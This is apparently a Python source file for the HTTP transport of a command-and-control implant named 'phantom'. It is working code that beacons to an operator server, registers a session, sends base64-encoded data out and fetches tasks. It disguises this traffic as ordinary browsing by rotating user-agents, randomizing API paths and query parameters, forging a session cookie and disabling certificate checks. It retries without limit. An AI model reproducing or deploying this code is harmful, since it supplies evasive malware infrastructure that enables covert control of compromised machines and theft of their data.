import base64
import json
import logging
import os
import random
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid

log = logging.getLogger("phantom.transport.http")

# Rotate through common browser user-agents to blend with normal traffic
_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
]

# Append random query params to each request so no two URLs are identical
_JITTER_PATHS = [
    "/api/v1/updates",
    "/api/v1/status",
    "/api/v1/config",
    "/api/v1/health",
    "/api/v1/sync",
]

_JITTER_PARAMS = [
    ("t", lambda: str(int(time.time()))),
    ("v", lambda: str(random.randint(1, 20))),
    ("check", lambda: random.choice(["true", "false"])),
    ("lang", lambda: random.choice(["en", "en-US", "en-GB"])),
    ("ref", lambda: uuid.uuid4().hex[:8]),
]


class HttpTransport:
    """C2 transport over HTTP(S) — disguises traffic as normal web requests."""

    def __init__(self, url: str, verify_ssl: bool = False,
                 proxy: str | None = None, user_agent: str | None = None,
                 headers: dict | None = None, timeout: float = 30.0,
                 retry_count: int = -1, retry_delay: float = 10.0,
                 ca_cert: str | None = None):
        self.base_url = url.rstrip("/")
        self.verify_ssl = verify_ssl
        self.proxy = proxy
        self.user_agent = user_agent
        self.timeout = timeout
        self.retry_count = retry_count
        self.retry_delay = retry_delay
        self.ca_cert = ca_cert
        self.extra_headers = headers or {}
        self.session_id: str | None = None
        self._connected = False
        self._ssl_ctx = self._build_ssl_context()
        self._opener = self._build_opener()

    @property
    def connected(self) -> bool:
        return self._connected

    def _build_ssl_context(self) -> ssl.SSLContext:
        ctx = ssl.create_default_context()
        if self.ca_cert and os.path.isfile(self.ca_cert):
            ctx.load_verify_locations(self.ca_cert)
        if not self.verify_ssl:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _build_opener(self) -> urllib.request.OpenerDirector:
        handlers: list = [urllib.request.HTTPSHandler(context=self._ssl_ctx)]
        proxy_url = self.proxy or os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY")
        if proxy_url:
            handlers.append(urllib.request.ProxyHandler({
                "http": proxy_url,
                "https": proxy_url,
            }))
        return urllib.request.build_opener(*handlers)

    def _get_headers(self) -> dict:
        # Pick a random user-agent each request to mimic diverse browser traffic
        ua = self.user_agent or random.choice(_USER_AGENTS)
        headers = {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,application/json,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Referer": self.base_url + "/",
        }
        if self.session_id:
            headers["Cookie"] = f"PHPSESSID={self.session_id}"
        headers.update(self.extra_headers)
        return headers

    def _jitter_url(self, path: str = "") -> str:
        # Pick a random API path and append random query params for URL jitter
        if not path:
            path = random.choice(_JITTER_PATHS)
        params = {}
        for key, gen in random.sample(_JITTER_PARAMS, k=random.randint(1, 3)):
            params[key] = gen()
        qs = urllib.parse.urlencode(params)
        return f"{self.base_url}{path}?{qs}"

    def _do_request(self, url: str, data: bytes | None = None,
                    method: str | None = None) -> bytes | None:
        headers = self._get_headers()
        if data is not None:
            headers["Content-Type"] = "application/json"
        req = urllib.request.Request(url, data=data, headers=headers,
                                     method=method)
        try:
            resp = self._opener.open(req, timeout=self.timeout)
            return resp.read()
        except urllib.error.HTTPError as e:
            log.warning(f"HTTP {e.code}: {e.reason}")
            return None
        except (urllib.error.URLError, OSError) as e:
            log.warning(f"Request failed: {e}")
            return None

    def connect(self) -> bool:
        self.session_id = uuid.uuid4().hex[:16]
        attempts = 0
        while self.retry_count == -1 or attempts < self.retry_count:
            try:
                url = self._jitter_url("/api/v1/register")
                payload = json.dumps({
                    "data": base64.b64encode(b"register").decode(),
                    "id": self.session_id,
                }).encode()
                body = self._do_request(url, data=payload)
                if body is not None:
                    self._connected = True
                    log.info(f"Connected via HTTP to {self.base_url}")
                    return True
            except Exception as e:
                log.warning(f"Connect error: {e}")

            attempts += 1
            if self.retry_count != -1 and attempts >= self.retry_count:
                return False
            time.sleep(self.retry_delay)
        return False

    def send(self, data: bytes) -> bool:
        if not self._connected or not self.session_id:
            return False
        attempts = 0
        while self.retry_count == -1 or attempts < self.retry_count:
            url = self._jitter_url("/api/v1/response")
            payload = json.dumps({
                "data": base64.b64encode(data).decode(),
                "id": self.session_id,
            }).encode()
            body = self._do_request(url, data=payload)
            if body is not None:
                return True

            attempts += 1
            if self.retry_count != -1 and attempts >= self.retry_count:
                break
            time.sleep(self.retry_delay)

        log.error("Send failed after retries")
        self._connected = False
        return False

    def recv(self) -> bytes | None:
        if not self._connected or not self.session_id:
            return None
        url = self._jitter_url(f"/api/v1/beacon/{self.session_id}")
        body = self._do_request(url)
        if not body:
            return None
        try:
            msg = json.loads(body)
            encoded = msg.get("data")
            if not encoded:
                return None
            return base64.b64decode(encoded)
        except (json.JSONDecodeError, ValueError) as e:
            log.warning(f"Recv decode error: {e}")
            return None

    def disconnect(self):
        if self.session_id:
            url = self._jitter_url("/api/v1/register")
            payload = json.dumps({
                "data": base64.b64encode(b"disconnect").decode(),
                "id": self.session_id,
            }).encode()
            self._do_request(url, data=None, method="DELETE")
        self._connected = False
        self.session_id = None
        log.info("Disconnected from HTTP transport")
